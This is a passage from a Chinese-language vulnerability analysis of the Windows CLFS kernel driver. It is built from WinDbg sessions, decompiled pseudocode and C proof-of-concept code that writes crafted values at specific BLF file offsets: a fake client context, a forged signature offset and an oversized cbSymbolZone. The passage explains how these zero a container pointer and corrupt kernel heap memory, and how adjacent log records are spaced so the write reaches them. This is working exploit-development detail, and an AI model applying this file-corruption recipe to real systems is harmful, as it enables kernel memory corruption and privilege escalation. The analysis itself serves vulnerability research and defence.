而后对BaseLogRecord+0x1338+cbSymbolZone处大小为v4的内存调用memset清零\nv4 = a2; BaseLogRecord = (CLFS_BASE_RECORD_HEADER *)CClfsBaseFile::GetBaseLogRecord(this); v7 = BaseLogRecord; if ( !BaseLogRecord ) return 3222929421i64; v8 = *(CLFS_LOG_BLOCK_HEADER **)(*(_QWORD *)(v6 + 48) + 48i64); *a3 = 0i64; cbSymbolZone = BaseLogRecord-\u0026gt;cbSymbolZone; if ( (char *)\u0026amp;BaseLogRecord[1] + cbSymbolZone + v4 \u0026gt; (char *)(\u0026amp;v8-\u0026gt;MajorVersion + v8-\u0026gt;SignaturesOffset) ) return 3221225507i64; v10 = (char *)\u0026amp;BaseLogRecord[1] + cbSymbolZone; memset(v10, 0, (unsigned int)v4); 在调试器中可以看到rcx指向了CLFS_CONTAINER_CONTEXT-\u0026gt;pContainer 的高四位。\n1: kd\u0026gt; dd rcx - 0x1c ffffbd84`4f3844d0 c1fdf008 00000030 00080000 00000000 ffffbd84`4f3844e0 00000000 00000000 4bd8b7c0 ffffbd84 ffffbd84`4f3844f0 00000001 00000002 00000000 00000000 ffffbd84`4f384500 003f005c 005c003f 003a0043 0055005c ffffbd84`4f384510 00650073 00730072 0050005c 00620075 ffffbd84`4f384520 0069006c 005c0063 0063002e 006e006f ffffbd84`4f384530 00610074 006e0069 00720065 0031005f ffffbd84`4f384540 00310034 00000000 00000000 00000000 1: kd\u0026gt; u CLFS!CClfsBaseFilePersisted::AllocSymbol+0x67: fffff801`270d0207 e874c8fcff call CLFS!memset (fffff801`2709ca80) fffff801`270d020c 01af28130000 add dword ptr [rdi+1328h],ebp fffff801`270d0212 33c0 xor eax,eax fffff801`270d0214 48891e mov qword ptr [rsi],rbx fffff801`270d0217 488b5c2430 mov rbx,qword ptr [rsp+30h] fffff801`270d021c 488b6c2438 mov rbp,qword ptr [rsp+38h] fffff801`270d0221 488b742440 mov rsi,qword ptr [rsp+40h] fffff801`270d0226 4883c420 add rsp,20h 继续运行，memset已经将该指针的高四位清零\n1: kd\u0026gt; p CLFS!CClfsBaseFilePersisted::AllocSymbol+0x6c: fffff801`270d020c 01af28130000 add dword ptr [rdi+1328h],ebp 1: kd\u0026gt; dd ffffbd84`4f3844d0 ffffbd84`4f3844d0 c1fdf008 00000030 00080000 00000000 ffffbd84`4f3844e0 00000000 00000000 4bd8b7c0 00000000 ffffbd84`4f3844f0 00000000 00000000 00000000 00000000 ffffbd84`4f384500 00000000 00000000 00000000 00000000 ffffbd84`4f384510 00000000 00000000 00000000 00000000 ffffbd84`4f384520 00000000 00000000 00000000 00000000 ffffbd84`4f384530 00000000 00000000 00000000 00000000 ffffbd84`4f384540 00000000 00000000 00000000 00000000 继续运行则触发异常\n1: kd\u0026gt; k # Child-SP RetAddr Call Site 00 ffffb807`d4c5f6d8 fffff801`28112c22 nt!DbgBreakPointWithStatus 01 ffffb807`d4c5f6e0 fffff801`28112206 nt!KiBugCheckDebugBreak+0x12 02 ffffb807`d4c5f740 fffff801`27ff89c7 nt!KeBugCheck2+0x946 03 ffffb807`d4c5fe50 fffff801`2800a869 nt!KeBugCheckEx+0x107 04 ffffb807`d4c5fe90 fffff801`28009cbc nt!KiBugCheckDispatch+0x69 05 ffffb807`d4c5ffd0 fffff801`280017af nt!KiSystemServiceHandler+0x7c 06 ffffb807`d4c60010 fffff801`27ee2467 nt!RtlpExecuteHandlerForException+0xf 07 ffffb807`d4c60040 fffff801`27ee1066 nt!RtlDispatchException+0x297 08 ffffb807`d4c60760 fffff801`2800a9ac nt!KiDispatchException+0x186 09 ffffb807`d4c60e20 fffff801`28006b43 nt!KiExceptionDispatch+0x12c 0a ffffb807`d4c61000 fffff801`270cb2d5 nt!KiPageFault+0x443 0b ffffb807`d4c61190 fffff801`27098655 CLFS!CClfsContainer::Close+0xd 0c ffffb807`d4c611c0 fffff801`270987b6 CLFS!CClfsLogFcbPhysical::CloseContainers+0x69 0d ffffb807`d4c611f0 fffff801`27098761 CLFS!CClfsLogFcbPhysical::Finalize+0x42 0e ffffb807`d4c61220 fffff801`270bdf42 CLFS!CClfsLogFcbPhysical::Release+0xb1 0f ffffb807`d4c61280 fffff801`270c0878 CLFS!CClfsRequest::Close+0xd6 10 ffffb807`d4c612d0 fffff801`270c0747 CLFS!ClfsDispatchIoRequest+0x108 11 ffffb807`d4c61320 fffff801`27eabac5 CLFS!CClfsDriver::LogIoDispatch+0x27 12 ffffb807`d4c61350 fffff801`281f088f nt!IofCallDriver+0x55 13 ffffb807`d4c61390 fffff801`28219af0 nt!IopDeleteFile+0x14f 14 ffffb807`d4c61410 fffff801`27eae1a7 nt!ObpRemoveObjectRoutine+0x80 15 ffffb807`d4c61470 fffff801`28222449 nt!ObfDereferenceObjectWithTag+0xc7 16 ffffb807`d4c614b0 fffff801`282e3745 nt!ObCloseHandleTableEntry+0x6c9 17 ffffb807`d4c615f0 fffff801`2828fadd nt!ExSweepHandleTable+0xd5 18 ffffb807`d4c616a0 fffff801`282b6d98 nt!ObKillProcess+0x35 19 ffffb807`d4c616d0 fffff801`282760f6 nt!PspRundownSingleProcess+0x204 1a ffffb807`d4c61760 fffff801`282777f8 nt!PspExitThread+0x5f6 1b ffffb807`d4c61860 fffff801`27eb4d77 nt!KiSchedulerApcTerminate+0x38 1c ffffb807`d4c618a0 fffff801`27ffce90 nt!KiDeliverApc+0x487 1d ffffb807`d4c61950 fffff801`2800a35f nt!KiInitiateUserApc+0x70 1e ffffb807`d4c61a90 00007ffd`40c90994 nt!KiSystemServiceExit+0x9f 1f 0000005f`4e1ffa88 00007ffd`40c42dc7 ntdll!NtWaitForWorkViaWorkerFactory+0x14 20 0000005f`4e1ffa90 00007ffd`40497034 ntdll!TppWorkerThread+0x2f7 21 0000005f`4e1ffd90 00000000`00000000 0x00007ffd`40497034 到CClfsLogFcbPhysical::CloseContainers查看伪代码可知，通过CClfsBaseFile::AcquireContainerContext函数获取到container context并存在v7变量中，而后将v7→pContainer指针取出，如果该指针不为零则将其传入CClfsContainer::Close\n__int64 __fastcall CClfsLogFcbPhysical::CloseContainers(CClfsLogFcbPhysical *this) { int v1; // esi unsigned int v2; // edi struct _CLFS_CONTAINER_CONTEXT *v4; // rbp CClfsContainer *v5; // rcx struct _CLFS_CONTAINER_CONTEXT *v7; // [rsp+30h] [rbp+8h] BYREF v7 = 0i64; v1 = 0; v2 = *((_DWORD *)this + 341); if ( v2 \u0026gt;= *((_DWORD *)this + 340) ) return (unsigned int)v1; while ( 1 ) { v1 = CClfsBaseFile::AcquireContainerContext( *((CClfsBaseFile **)this + 85), *((_DWORD *)this + (v2 \u0026amp; 0x3FF) + 342), \u0026amp;v7); if ( v1 \u0026lt; 0 ) break; v4 = v7; if ( !v7 ) break; v5 = (CClfsContainer *)*((_QWORD *)v7 + 3); if ( v5 ) { CClfsContainer::Close(v5); (*(void (__fastcall **)(_QWORD))(**((_QWORD **)v4 + 3) + 8i64))(*((_QWORD *)v4 + 3)); *((_QWORD *)v4 + 3) = 0i64; } CClfsBaseFile::ReleaseContainerContext(*((CClfsBaseFile **)this + 85), \u0026amp;v7); if ( ++v2 \u0026gt;= *((_DWORD *)this + 340) ) return (unsigned int)v1; } return 3222929421i64; } 由于前面将这个指针的高四位清零，所以传入CClfsContainer::Close函数的指针为0x03\n1: kd\u0026gt; rrcx rcx=0000000000000003 1: kd\u0026gt; u CLFS!CClfsLogFcbPhysical::CloseContainers+0x69: fffff801`27098655 488b4d18 mov rcx,qword ptr [rbp+18h] fffff801`27098659 488b01 mov rax,qword ptr [rcx] fffff801`2709865c 488b4008 mov rax,qword ptr [rax+8] fffff801`27098660 ff156abf0100 call qword ptr [CLFS!_guard_dispatch_icall_fptr (fffff801`270b45d0)] fffff801`27098666 4883651800 and qword ptr [rbp+18h],0 fffff801`2709866b 488b8ba8020000 mov rcx,qword ptr [rbx+2A8h] fffff801`27098672 488d542430 lea rdx,[rsp+30h] fffff801`27098677 e8cc9d0200 call CLFS!CClfsBaseFile::ReleaseContainerContext (fffff801`270c2448) 在CClfsContainer::Close函数内对该指针解引用，导致异常\nCLFS!CClfsContainer::Close: fffff801`270cb2c8 48895c2408 mov qword ptr [rsp+8], rbx fffff801`270cb2cd 57 push rdi fffff801`270cb2ce 4883ec20 sub rsp, 20h fffff801`270cb2d2 488bd9 mov rbx, rcx fffff801`270cb2d5 488b4920 mov rcx, qword ptr [rcx+20h] 第二种方式\n第二种方式是修改cbSymbolZone 为超大的值，使得BaseLogRecord+0x1338+cbSymbolZone 能够到达下一个BaseLogRecord的container context，并利用memset将container_context→pContainer指针的高四位清零。\n在CLFS!CClfsBaseFilePersisted::ReadMetadataBlock断点\nbp CLFS!CClfsBaseFilePersisted::ReadMetadataBlock 运行PoC，在ReadMetadataBlock断下\n1: kd\u0026gt; rrdx rdx=0000000000007a00 1: kd\u0026gt; k # Child-SP RetAddr Call Site 00 fffff389`53916f50 fffff806`62d9a395 CLFS!CClfsBaseFilePersisted::ReadMetadataBlock+0xaa 01 fffff389`53916ff0 fffff806`62d9a204 CLFS!CClfsBaseFile::AcquireMetadataBlock+0x45 02 fffff389`53917020 fffff806`62d99c36 CLFS!CClfsBaseFilePersisted::ReadImage+0x1e8 03 fffff389`53917080 fffff806`62d62da2 CLFS!CClfsBaseFilePersisted::OpenImage+0x2fa 04 fffff389`53917100 fffff806`62d8eaeb CLFS!CClfsLogFcbPhysical::Initialize+0x326 05 fffff389`53917240 fffff806`62d90a2b CLFS!CClfsRequest::Create+0x4ef 06 fffff389`53917390 fffff806`62d907f7 CLFS!CClfsRequest::Dispatch+0x97 07 fffff389`539173e0 fffff806`62d90747 CLFS!ClfsDispatchIoRequest+0x87 08 fffff389`53917430 fffff806`668abac5 CLFS!CClfsDriver::LogIoDispatch+0x27 09 fffff389`53917460 fffff806`668629a4 nt!IofCallDriver+0x55 0a fffff389`539174a0 fffff806`66bf1dfd nt!IoCallDriverWithTracing+0x34 0b fffff389`539174f0 fffff806`66c20cbe nt!IopParseDevice+0x117d 0c fffff389`53917660 fffff806`66c01d3a nt!ObpLookupObjectName+0x3fe 0d fffff389`53917830 fffff806`66c88f0f nt!ObOpenObjectByNameEx+0x1fa 0e fffff389`53917960 fffff806`66c88ae9 nt!IopCreateFile+0x40f 0f fffff389`53917a00 fffff806`66a0a2b5 nt!NtCreateFile+0x79 10 fffff389`53917a90 00007ffa`91b0d9e4 nt!KiSystemServiceCopyEnd+0x25 11 00000058`ec6fe888 00007ffa`8bc92199 ntdll!NtCreateFile+0x14 12 00000058`ec6fe890 00000000`00000000 0x00007ffa`8bc92199 1: kd\u0026gt; u CLFS!CClfsBaseFilePersisted::ReadMetadataBlock+0xaa: fffff806`62d940ba e8a1e02104 call nt!ExAllocatePoolWithTag (fffff806`66fb2160) fffff806`62d940bf 488bf0 mov rsi,rax fffff806`62d940c2 4889442438 mov qword ptr [rsp+38h],rax fffff806`62d940c7 4885c0 test rax,rax ReadMetadataBlock调用nt!ExAllocatePoolWithTag分配内核堆存储基本记录，调试器中可以看到内存分配在ffffab0523ecf000\n1: kd\u0026gt; p CLFS!CClfsBaseFilePersisted::ReadMetadataBlock+0xaf: fffff806`62d940bf 488bf0 mov rsi,rax 1: kd\u0026gt; rrax rax=ffffab0523ecf000 在下面两个地方下断点\nba w8 ffffab0523ecf000+0x68 ba w8 ffffab0523ecf000+0x200*0xE-0x8 这两个地方分别是LogBlockHeader→SignatureOffset和第十四个扇区签名的位置(0xc*0x200 + 0x1fe)\n继续运行，在第二个断点断下，调用栈：\n1: kd\u0026gt; k # Child-SP RetAddr Call Site 00 fffff389`539170c0 fffff806`62d63672 CLFS!CClfsLogFcbPhysical::ResetLog+0x100 01 fffff389`53917100 fffff806`62d8eaeb CLFS!CClfsLogFcbPhysical::Initialize+0xbf6 02 fffff389`53917240 fffff806`62d90a2b CLFS!CClfsRequest::Create+0x4ef 03 fffff389`53917390 fffff806`62d907f7 CLFS!CClfsRequest::Dispatch+0x97 04 fffff389`539173e0 fffff806`62d90747 CLFS!ClfsDispatchIoRequest+0x87 05 fffff389`53917430 fffff806`668abac5 CLFS!CClfsDriver::LogIoDispatch+0x27 06 fffff389`53917460 fffff806`668629a4 nt!IofCallDriver+0x55 07 fffff389`539174a0 fffff806`66bf1dfd nt!IoCallDriverWithTracing+0x34 08 fffff389`539174f0 fffff806`66c20cbe nt!IopParseDevice+0x117d 09 fffff389`53917660 fffff806`66c01d3a nt!ObpLookupObjectName+0x3fe 0a fffff389`53917830 fffff806`66c88f0f nt!ObOpenObjectByNameEx+0x1fa 0b fffff389`53917960 fffff806`66c88ae9 nt!IopCreateFile+0x40f 0c fffff389`53917a00 fffff806`66a0a2b5 nt!NtCreateFile+0x79 0d fffff389`53917a90 00007ffa`91b0d9e4 nt!KiSystemServiceCopyEnd+0x25 0e 00000058`ec6fe888 00007ffa`8bc92199 ntdll!NtCreateFile+0x14 0f 00000058`ec6fe890 00000000`00000000 0x00007ffa`8bc92199 1: kd\u0026gt; ub CLFS!CClfsLogFcbPhysical::ResetLog+0xd7: fffff806`62d7151b 48894140 mov qword ptr [rcx+40h],rax fffff806`62d7151f 488b83d8010000 mov rax,qword ptr [rbx+1D8h] fffff806`62d71526 48894148 mov qword ptr [rcx+48h],rax fffff806`62d7152a 488b83e8010000 mov rax,qword ptr [rbx+1E8h] fffff806`62d71531 48894150 mov qword ptr [rcx+50h],rax fffff806`62d71535 488b83f0010000 mov rax,qword ptr [rbx+1F0h] **fffff806`62d7153c 48894158 mov qword ptr [rcx+58h],rax** fffff806`62d71540 806178df and byte ptr [rcx+78h],0DFh 1: kd\u0026gt; rrcx rcx=ffffab0523ed0ba0 继续运行，rcx+0x58的位置已经被0xFFFFFFFF00000000覆盖了，而rcx+0x5e = ffffab0523ecf000 + 0xd * 0x200 + 0x1FE，也就是rcx+0x5e位于第十四扇区签名处，此时这个签名已经被0xFFFF覆盖了。\n1: kd\u0026gt; db rcx ffffab05`23ed0ba0 07 f0 fd c1 88 00 00 00-00 00 00 01 00 00 00 00 ................ ffffab05`23ed0bb0 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffab05`23ed0bc0 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffab05`23ed0bd0 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffab05`23ed0be0 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffab05`23ed0bf0 00 00 00 00 00 00 00 00-00 00 00 00 ff ff ff ff ................ ffffab05`23ed0c00 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffab05`23ed0c10 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 对应伪代码如下\n__int64 __fastcall CClfsLogFcbPhysical::ResetLog(CClfsLogFcbPhysical *this) { struct _CLFS_CLIENT_CONTEXT *v2; // rcx . *((CLFS_LSN *)this + 62) = CLFS_LSN_INVALID; // FF FF FF FF 00 00 00 00 ..... v2-\u0026gt;lsnRestart.Internal = *((_QWORD *)this + 62);// 58h的偏移 v2-\u0026gt;eState \u0026amp;= ~0x20u; CClfsBaseFile::ReleaseClientContext(*((CClfsBaseFile **)this + 85), \u0026amp;v7); CClfsBaseFilePersisted::ResetContainerQ( *((CClfsBaseFilePersisted **)this + 85), (unsigned int *const)this + 342, v4, (unsigned int *)this + 340, (unsigned int *)this + 341); v5 = CClfsBaseFilePersisted::IncrementUsn(*((CClfsBaseFilePersisted **)this + 85)); v6 = (CClfsBaseFilePersisted *)*((_QWORD *)this + 85); *((_BYTE *)this + 657) = v5; *((_BYTE *)this + 657) = CClfsBaseFilePersisted::IncrementUsn(v6); return 0i64; } 现在有三个问题：\n为什么CLIENT_CONTEXT→lsnRestart.Internal会和第十四个扇区签名重叠 怎么调用到ResetLog函数导致重叠区域被重置为0xFFFF 为什么重叠的是第十四个不是其他 回到PoC中，首先将BLF文件内偏移0x9A8，这是CLFS_BASE_RECORD_HEADER→rgClients ，该处伪造了假的client context偏移0x1b30\nchar checkSum[] = { 0x00, 0x00, 0x00, 0x00 }; // {0x59, 0xdf, 0x44, 0x06}; // offset 0x80c char signaturOffset[] = { 0x50, 0x00, 0x00, 0x00 }; // offset 0x868 char ccoffsetArray[] = { 0x30, 0x1b, 0x00, 0x00 }; // offset 0x9a8 char cbsymbolZone[] = { 0x4b, 0x11, 0x01, 0x00 }; // offset 0x1b98 char blockNameoffset[] = { 0xb8, 0x1b, 0x00, 0x00 }; // offset 0x2390 char blockAtributeoffset[] = { 0x30, 0x1b, 0x00, 0x00 }; // offset 0x2394 _wfopen_s(\u0026amp;pFile, stored_env_open, L\u0026#34;r+\u0026#34;); if (pFile == 0) { printf(\u0026#34;Cant\u0026#39;t open file, error %x\\n\u0026#34;, GetLastError()); //\tgetchar(); exit(1); } printf(\u0026#34;[+] file successfully opened\\n\u0026#34;); // 校验和 fseek(pFile, 0x80c, SEEK_SET); fwrite(checkSum, sizeof(char), sizeof(checkSum), pFile); // Signature 值 fseek(pFile, 0x868, SEEK_SET); fwrite(signaturOffset, sizeof(char), sizeof(signaturOffset), pFile); // client context的偏移 fseek(pFile, 0x9a8, SEEK_SET); fwrite(ccoffsetArray, sizeof(char), sizeof(ccoffsetArray), pFile); // cbsymbolZone偏移，写入恶意的cbsymbolZone fseek(pFile, 0x1b98, SEEK_SET); fwrite(cbsymbolZone, sizeof(char), sizeof(cbsymbolZone), pFile); fseek(pFile, 0x2390, SEEK_SET); fwrite(blockNameoffset, sizeof(char), sizeof(blockNameoffset), pFile); fseek(pFile, 0x2394, SEEK_SET); fwrite(blockAtributeoffset, sizeof(char), sizeof(blockAtributeoffset), pFile); 而后在偏移0x23a0(0x1b30+0x870)处伪造假的client context，伪造的假client context需要有正确的client context头，将原client context复制过去即可。此时client context→lsnRestart.Internal = 0x23a0 + 0x58 = 23f8，位于基本记录的0x1bf8处，第14个扇区的扇区签名位于0xd * 0x200 + 0x1fe=1BFE ，client context→lsnRestart.Internal 大小八个字节，刚好高二位能够覆盖到扇区签名。\nchar fakeClientcontext[] = { 0x07, 0xf0, 0xfd, 0xc1, 0x88 }; // offset 0x23a0 char fakeClientcontext2[] = { 0x01, 0x00, 0x00, 0x00 }; // offset 0x23ab char fakeClientcontext3[] = { 0x20, 0x00, 0x00, 0x00 }; // offset 0x2418 // Client context，伪造假的Client context头 fseek(pFile, 0x23a0, SEEK_SET); fwrite(fakeClientcontext, sizeof(char), sizeof(fakeClientcontext), pFile); // Client context，伪造假的Client context头 fseek(pFile, 0x23ab, SEEK_SET); fwrite(fakeClientcontext2, sizeof(char), sizeof(fakeClientcontext2), pFile); // Client context，伪造假的值，使得程序进入ResetLog fseek(pFile, 0x2418, SEEK_SET); fwrite(fakeClientcontext3, sizeof(char), sizeof(fakeClientcontext3), pFile); 而ResetLog中要覆盖八个字节，刚好将第十四个扇区签名覆盖为0xFFFF\nv2-\u0026gt;lsnRestart.Internal = *((_QWORD *)this + 62);// 58h的偏移 __int64 __fastcall CClfsLogFcbPhysical::Initialize( ULONG_PTR a1, __int64 a2, __int64 a3, int a4, ULONG DesiredShareAccess, __int64 a6, char a7, __int64 a8, PFILE_OBJECT FileObject, unsigned __int8 a10) { ..... CClfsBaseFile::AddRef(v25); EventObject = CClfsBaseFilePersisted::OpenImage(// 打开现有日志文件会调用这里、 *(CClfsBaseFilePersisted **)(a1 + 680), \u0026amp;Destination, (const struct _CLFS_FILTER_CONTEXT *)\u0026amp;v88, a10, (unsigned __int8 *)\u0026amp;v94); ..... } CClfsBaseFile::AcquireClientContext(*(PERESOURCE **)(a1 + 680), 0, \u0026amp;v77);// 获取客户端上下文 if ( (v77-\u0026gt;eState \u0026amp; 0x20) == 0 || (*(unsigned __int8 (__fastcall **)(ULONG_PTR))(*(_QWORD *)a1 + 312i64))(a1) ) { ...... } else { CClfsLogFcbPhysical::ResetLog((CClfsLogFcbPhysical *)a1); *(_DWORD *)(a1 + 348) |= 0x40u; v39 = -1; } ..... return (unsigned int)EventObject; } 继续调试，调试器在ClfsEncodeBlockPrivate断下\n1: kd\u0026gt; k # Child-SP RetAddr Call Site 00 fffff389`53916f70 fffff806`62d6802d CLFS!ClfsEncodeBlockPrivate+0xee 01 fffff389`53916fb0 fffff806`62d92232 CLFS!ClfsEncodeBlock+0x1d 02 fffff389`53916fe0 fffff806`62d899a0 CLFS!CClfsBaseFilePersisted::WriteMetadataBlock+0x152 03 fffff389`53917070 fffff806`62d6161f CLFS!CClfsBaseFilePersisted::FlushImage+0x40 04 fffff389`539170b0 fffff806`62d63701 CLFS!CClfsLogFcbPhysical::FlushMetadata+0xef 05 fffff389`53917100 fffff806`62d8eaeb CLFS!CClfsLogFcbPhysical::Initialize+0xc85 06 fffff389`53917240 fffff806`62d90a2b CLFS!CClfsRequest::Create+0x4ef 07 fffff389`53917390 fffff806`62d907f7 CLFS!CClfsRequest::Dispatch+0x97 08 fffff389`539173e0 fffff806`62d90747 CLFS!ClfsDispatchIoRequest+0x87 09 fffff389`53917430 fffff806`668abac5 CLFS!CClfsDriver::LogIoDispatch+0x27 0a fffff389`53917460 fffff806`668629a4 nt!IofCallDriver+0x55 0b fffff389`539174a0 fffff806`66bf1dfd nt!IoCallDriverWithTracing+0x34 0c fffff389`539174f0 fffff806`66c20cbe nt!IopParseDevice+0x117d 0d fffff389`53917660 fffff806`66c01d3a nt!ObpLookupObjectName+0x3fe 0e fffff389`53917830 fffff806`66c88f0f nt!ObOpenObjectByNameEx+0x1fa 0f fffff389`53917960 fffff806`66c88ae9 nt!IopCreateFile+0x40f 10 fffff389`53917a00 fffff806`66a0a2b5 nt!NtCreateFile+0x79 11 fffff389`53917a90 00007ffa`91b0d9e4 nt!KiSystemServiceCopyEnd+0x25 12 00000058`ec6fe888 00007ffa`8bc92199 ntdll!NtCreateFile+0x14 13 00000058`ec6fe890 00000000`00000000 0x00007ffa`8bc92199 ClfsEncodeBlockPrivate伪代码：\n__int64 __fastcall ClfsEncodeBlockPrivate( struct _CLFS_LOG_BLOCK_HEADER *a1, unsigned int a2, UCHAR a3, unsigned __int8 a4) { int ClientId_low; // eax ...... ClientId_low = LOWORD(a1-\u0026gt;ClientId); v21[0] = 0; // 段签名数组 if ( !(_WORD)ClientId_low || HIWORD(a1-\u0026gt;ClientId) \u0026lt; (unsigned __int16)ClientId_low || ClientId_low \u0026lt;\u0026lt; 9 \u0026gt; a2 ) return 3222929418i64; if ( a4 \u0026gt; 0x10u ) return 3221225485i64; v8 = 65809; if ( !_bittest(\u0026amp;v8, a4) ) return 3221225485i64; if ( (a1-\u0026gt;Checksum \u0026amp; 1) != 0 ) return 3222929418i64; SignaturesOffset = a1-\u0026gt;SignaturesOffset; v10 = a2 \u0026gt;\u0026gt; 9; // 3D a1-\u0026gt;Usn = a3; HIBYTE(v22) = a3; if ( (int)ULongAdd(SignaturesOffset, 2 * (a2 \u0026gt;\u0026gt; 9), v21) \u0026lt; 0 || v21[0] \u0026lt; v11 || (v11 \u0026amp; 7) != 0 || v21[0] \u0026gt; a2 ) return 3222929418i64; v15 = 0; if ( v10 ) { do { v14 += 2i64; v16 = 32; v17 = 64; if ( *(unsigned __int16 *)(v13 + 4) - 1 != v15 ) v16 = 0; if ( v15 ) v17 = 0; v18 = v17 | v16; v19 = v15 \u0026lt;\u0026lt; 9; // 段偏移 LOBYTE(v22) = a4 | v18; ++v15; *(_WORD *)(v14 - 2) = *(_WORD *)(v19 + v13 + 510);// 循环相加，第14个段的签名会覆盖到SignatureOffset *(_WORD *)((unsigned int)v19 + v13 + 510) = v22; } while ( v15 \u0026lt; v10 ); v12 = *(_DWORD *)(v13 + 16); } *(_DWORD *)(v13 + 16) = v12 \u0026amp; 0xFFFFFFFC | 1; return 0i64; } 该代码获取LOG_BLOCK_HEADER→SignaturesOffset的值，在PoC内已被设为0x50，而后循环读取每个扇区的签名并覆盖到SignaturesOffset偏移处，此时将从0x50开始写入数据，每次写入0x2个字节。\n1: kd\u0026gt; ?0xd * 2 Evaluate expression: 26 = 00000000`0000001a 1: kd\u0026gt; rr11 r11=ffffab0523ecf06a 1: kd\u0026gt; ?r11-0x1a Evaluate expression: -93436410793904 = ffffab05`23ecf050 在第十三个扇区覆盖时，偏移已经到了SignatureOffset处，第十三个扇区签名为0x0050，所以SignatureOffset 低2位为0050\n1: kd\u0026gt; ?ffffab05`23ecf050+2*0xc Evaluate expression: -93436410793880 = ffffab05`23ecf068 00000000 CLFS_LOG_BLOCK_HEADER struc ; (sizeof=0x70, align=0x8, copyof_491) 00000000 MajorVersion db ? 00000001 MinorVersion db ? 00000002 Usn db ? 00000003 db ? ; undefined 00000004 ClientId dd ? 00000008 TotalSectorCount dw ? 0000000A ValidSectorCount dw ? 0000000C Padding dd ? 00000010 Checksum dd ? 00000014 Flags dd ? 00000018 CurrentLsn CLFS_LSN ? 00000020 NextLsn CLFS_LSN ? 00000028 RecordOffsets dd 16 dup(?) 00000068 SignaturesOffset dd ? 第十四个扇区签名已经被覆盖为0xFFFF，再将第十四个扇区覆盖在SignatureOffset高两位字节，SignatureOffset值变为0XFFFF0050\n1: kd\u0026gt; db ffffab0523ecf000 L0x80 ffffab05`23ecf000 15 00 01 00 3d 00 3d 00-00 00 00 00 00 00 00 00 ....=.=......... ffffab05`23ecf010 02 00 00 00 00 00 00 00-00 00 00 00 ff ff ff ff ................ ffffab05`23ecf020 00 00 00 00 ff ff ff ff-70 00 00 00 00 00 00 00 ........p....... ffffab05`23ecf030 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffab05`23ecf040 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffab05`23ecf050 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffab05`23ecf060 00 00 00 00 00 00 00 00-50 00 ff ff 00 00 00 00 ........P....... ffffab05`23ecf070 02 00 00 00 00 00 00 00-27 86 fc 26 07 10 ee 11 ........\u0026#39;..\u0026amp;.... 回到AllocSymbol中，由于SignatureOffset变为0XFFFF0050，导致即使cbSymbolZone 被设为000000000001114b 也可以通过if条件判断，到达memset`\n__int64 __fastcall CClfsBaseFilePersisted::AllocSymbol(CClfsBaseFilePersisted *this, unsigned int a2, void **a3) { __int64 v4; // rbp CLFS_BASE_RECORD_HEADER *BaseLogRecord; // rax __int64 v6; // r8 this指针 CLFS_BASE_RECORD_HEADER *v7; // rdi CLFS_LOG_BLOCK_HEADER *v8; // rcx __int64 cbSymbolZone; // r8 char *v10; // rbx __int64 result; // rax v4 = a2; BaseLogRecord = (CLFS_BASE_RECORD_HEADER *)CClfsBaseFile::GetBaseLogRecord(this); v7 = BaseLogRecord; if ( !BaseLogRecord ) return 3222929421i64; v8 = *(CLFS_LOG_BLOCK_HEADER **)(*(_QWORD *)(v6 + 48) + 48i64); *a3 = 0i64; cbSymbolZone = BaseLogRecord-\u0026gt;cbSymbolZone; if ( (char *)\u0026amp;BaseLogRecord[1] + cbSymbolZone + v4 \u0026gt; (char *)(\u0026amp;v8-\u0026gt;MajorVersion + v8-\u0026gt;SignaturesOffset) ) return 3221225507i64; v10 = (char *)\u0026amp;BaseLogRecord[1] + cbSymbolZone; memset(v10, 0, (unsigned int)v4); v7-\u0026gt;cbSymbolZone += v4; result = 0i64; *a3 = v10; return result; } 0: kd\u0026gt; dq rax+0x1328 ffffa78f`9468c398 00000000`0001114b 00000001`03030000 ffffa78f`9468c3a8 00000030`c1fdf006 000000b8`02d20016 ffffa78f`9468c3b8 00000000`00000000 00000000`00000000 ffffa78f`9468c3c8 00001368`000013f0 00000000`00000000 ffffa78f`9468c3d8 00000088`c1fdf007 00009c40`01000000 ffffa78f`9468c3e8 00000000`00000000 00000000`00000000 ffffa78f`9468c3f8 01100000`00000000 00000000`00000000 ffffa78f`9468c408 00000000`00000000 ffffffff`00000000 那么此处为什么要设为0x1114b呢。\n在多次创建日志文件后，后面创建的每个日志文件的Base log record的内存间距稳定在0x11000\n0: kd\u0026gt; db rax - 0x70 + 0x11000 ffffa78f`9469c000 15 00 03 00 3d 00 3d 00-00 00 00 00 00 00 00 00 ....=.=......... ffffa78f`9469c010 02 00 00 00 00 00 00 00-00 00 00 00 ff ff ff ff ................ ffffa78f`9469c020 00 00 00 00 ff ff ff ff-70 00 00 00 00 00 00 00 ........p....... ffffa78f`9469c030 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffa78f`9469c040 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffa78f`9469c050 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffa78f`9469c060 00 00 00 00 00 00 00 00-80 79 00 00 00 00 00 00 .........y...... ffffa78f`9469c070 05 00 00 00 00 00 00 00-93 76 34 8f 1b 10 ee 11 .........v4..... 此处在调试器中后一个日志文件的container context偏移为0x1468\n0: kd\u0026gt; dw ffffa78f`9469c000+0x70 + 0x328 ffffa78f`9469c398 1468 0000 0000 0000 0000 0000 0000 0000 ffffa78f`9469c3a8 0000 0000 0000 0000 0000 0000 0000 0000 ffffa78f`9469c3b8 0000 0000 0000 0000 0000 0000 0000 0000 ffffa78f`9469c3c8 0000 0000 0000 0000 0000 0000 0000 0000 ffffa78f`9469c3d8 0000 0000 0000 0000 0000 0000 0000 0000 ffffa78f`9469c3e8 0000 0000 0000 0000 0000 0000 0000 0000 ffffa78f`9469c3f8 0000 0000 0000 0000 0000 0000 0000 0000 ffffa78f`9469c408 0000 0000 0000 0000 0000 0000 0000 0000 0: kd\u0026gt; dd ffffa78f`9469c000+0x70 + 0x1468 ffffa78f`9469d4d8 c1fdf008 00000030 00080000 00000000 ffffa78f`9469d4e8 00000000 00000000 